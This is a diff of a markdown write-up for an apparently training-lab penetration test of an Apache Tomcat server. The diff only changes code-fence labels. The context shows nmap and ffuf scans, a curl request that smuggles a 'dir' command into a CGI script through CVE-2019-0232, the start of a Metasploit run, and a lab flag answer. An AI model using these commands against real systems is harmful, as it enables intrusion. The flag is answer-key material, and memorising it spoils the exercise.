@@ -4,7 +4,7 @@ During a penetration test against the company Inlanefreight, you have performed 
 ## Questions
 1. What vulnerable application is running? **Answer: tomcat**
    - Run a nmap scan on all ports → notice it is running vulnerable version of Apache Tomcat/9.0.0.M1:
-        ```sh
+        ```shellsession
         $ sudo nmap -sV -sC -Pn -p- -T4 10.129.64.118
         Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-27 06:11 EDT
         Nmap scan report for 10.129.64.118
@@ -70,7 +70,7 @@ During a penetration test against the company Inlanefreight, you have performed 
 4. Exploit the application to obtain a shell and submit the contents of the flag.txt file on the Administrator desktop. **Answer: f55763d31a8f63ec935abd07aee5d3d0**
    - Apache Tomcat/9.0.0.M1 is vulnerable to CVE-2019-0232 which is a conditional RCE (vulnerable version running on Windows with `enableCmdLineArguments` enabled)
    - Try to identify if `enableCmdLineArguments` is enabled by bruteforcing for CGI scripts → Found `cmd.bat`:
-        ```sh
+        ```shellsession
         $ ffuf -u http://10.129.67.19:8080/cgi/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bat
 
                 /'___\  /'___\           /'___\       
@@ -98,7 +98,7 @@ During a penetration test against the company Inlanefreight, you have performed 
         :: Progress: [9500/9500] :: Job [1/1] :: 255 req/sec :: Duration: [0:00:37] :: Errors: 0 ::
         ```
    - Confirm it with a simple `dir`:
-        ```sh
+        ```shellsession
         $ curl 'http://10.129.67.19:8080/cgi/cmd.bat?&dir'
         [1]+  Done                    curl http://10.129.67.19:8080/cgi/cmd.bat?
         Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi
@@ -111,7 +111,7 @@ During a penetration test against the company Inlanefreight, you have performed 
                     3 Dir(s)   6,765,953,024 bytes free
         ```
    - Run the exploit with metasploit:
-        ```sh
+        ```shellsession
         $ msfconsole
         Metasploit tip: Tired of setting RHOSTS for modules? Try globally 
         setting it with setg RHOSTS x.x.x.x
